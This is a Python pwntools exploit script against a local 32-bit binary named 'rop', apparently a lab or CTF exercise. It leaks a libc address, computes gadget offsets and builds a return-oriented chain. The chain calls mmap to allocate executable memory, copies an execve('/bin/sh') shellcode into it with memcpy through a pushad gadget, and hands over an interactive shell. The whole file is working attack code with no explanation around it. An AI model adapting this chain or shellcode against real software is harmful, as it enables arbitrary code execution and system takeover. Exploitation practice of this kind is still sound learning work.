from pwn import *
from struct import *

#context.log_level = 'debug'

#32bit OS
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
#64bit OS
#libc = ELF("/lib32/libc-2.23.so")

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

binary = ELF('./rop')
p = process(binary.path)

p.recvuntil('Printf() address : ')
stackAddr = p.recvuntil('\n')
stackAddr = int(stackAddr,16)

new_memory = 0x20000000

#Libc
#You need to change the value to match the environment you are testing.
libc_base = stackAddr - 0x49670
libc_mmap = libc_base + libc.symbols['mmap']
libc_memcpy = libc_base + libc.symbols['memcpy']

#ROP Gadget
#You need to change the value to match the environment you are testing.
libc_popad = libc_base + 0x00168dfe
libc_pushad = libc_base + 0x0000979c
libc_xchg_eax_edi = libc_base + 0x0007633e
libc_pop_esi = libc_base + 0x00017828
libc_pop_ebp = libc_base + 0x000179a7
libc_pop_ebx = libc_base + 0x00018395

log.info('Libc base : '+hex(libc_base))
log.info('mmap addr : '+hex(libc_mmap))
log.info('memcpy addr : '+hex(libc_memcpy))

payload = "A"*66

#mmap(0x20000000,0x1000,0x7,0x22,0xffffffff,0)
payload += p32(libc_mmap)
payload += p32(libc_popad)
payload += p32(new_memory)
payload += p32(0x1000)
payload += p32(0x7)
payload += p32(0x22)
payload += p32(0xffffffff)
payload += p32(0)
payload += 'AAAA' * 2


#memcpy(new_memory,'address of shellcode',(len(shellcode))
payload += p32(libc_memcpy)
payload += p32(libc_xchg_eax_edi)
payload += p32(libc_pop_esi)
payload += p32(new_memory)
payload += p32(libc_pop_ebp)
payload += p32(new_memory)
payload += p32(libc_pop_ebx)
payload += p32(len(shellcode))
payload += p32(libc_pushad)
payload += shellcode

p.send(payload)
p.interactive()
